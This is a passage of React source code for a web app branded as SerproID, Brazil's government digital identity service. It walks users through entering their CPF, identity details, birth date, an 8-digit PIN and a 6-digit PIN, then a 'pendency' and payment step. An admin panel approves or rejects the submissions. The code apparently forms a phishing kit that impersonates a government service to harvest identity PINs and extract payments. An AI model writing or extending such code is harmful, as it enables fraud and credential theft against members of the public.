disabled={saving === row.id || row.admin_status === "REJECTED"} onClick={() => updateRow(row.id, "REJECTED")}>× Rejeitar</button></td></tr>)}</tbody></table></div>}<div className="pagination"><span>{filteredRows.length} registros exibidos</span><button type="button" onClick={load}>Atualizar</button></div></section></div></main>;
}

export default function App() {
  const [route] = useState(window.location.pathname); const [step, setStep] = useState(1); const [cpf, setCpf] = useState(""); const [identity, setIdentity] = useState(null); const [pin8, setPin8] = useState(""); const [pin6, setPin6] = useState(""); const [pendency, setPendency] = useState(null); const [adminLogged, setAdminLogged] = useState(hasAdminSession);
  useEffect(() => { document.title = route.startsWith("/admin") ? "SerproID — Painel Administrativo" : "SerproID — Identidade digital segura"; }, [route]);
  useEffect(() => { if (route.startsWith("/admin")) return undefined; let cancelled = false; (async () => { try { const saved = JSON.parse(localStorage.getItem(PROCESSING_STORAGE_KEY) || "null"); if (!saved?.cpf) return; const existing = await checkProcessing(saved.cpf); if (!cancelled && existing) setStep(9); else if (!existing) localStorage.removeItem(PROCESSING_STORAGE_KEY); } catch { if (!cancelled) localStorage.removeItem(PROCESSING_STORAGE_KEY); } })(); return () => { cancelled = true; }; }, [route]);
  if (route.startsWith("/admin")) { if (!adminLogged) return <AdminLogin onLogin={() => setAdminLogged(true)} />; return <AdminDashboard onLogout={() => { sessionStorage.removeItem(ADMIN_SESSION_KEY); setAdminLogged(false); }} />; }
  return <main className="page"><div className="page__inner"><Header step={step} /><div className="content" key={step}>{step === 1 && <Step1 cpf={cpf} setCpf={setCpf} onContinue={(data) => { setIdentity(data); setStep(2); }} onProcessing={() => setStep(9)} />}{step === 2 && <Step2 cpf={cpf} identity={identity} onContinue={() => setStep(3)} onBack={() => setStep(1)} />}{step === 3 && <StepBirthDate identity={identity} onContinue={() => setStep(4)} onBack={() => setStep(2)} />}{step === 4 && <StepPin onContinue={(value) => { setPin8(value); setStep(5); }} onBack={() => setStep(3)} />}{step === 5 && <StepPin6 previousPin={pin8} onContinue={(value) => { setPin6(value); setStep(6); }} onBack={() => setStep(4)} />}{step === 6 && <StepPendency cpf={cpf} onContinue={(data) => { setPendency(data); setStep(7); }} onProcessing={setStep} onBack={() => setStep(5)} />}{step === 7 && <StepPayment cpf={cpf} identity={identity} pin8={pin8} pin6={pin6} pendency={pendency} onContinue={() => setStep(9)} onProcessing={() => setStep(9)} onBack={() => setStep(6)} />}{step === 9 && <Step4 />}</div><Footer /></div></main>;
}
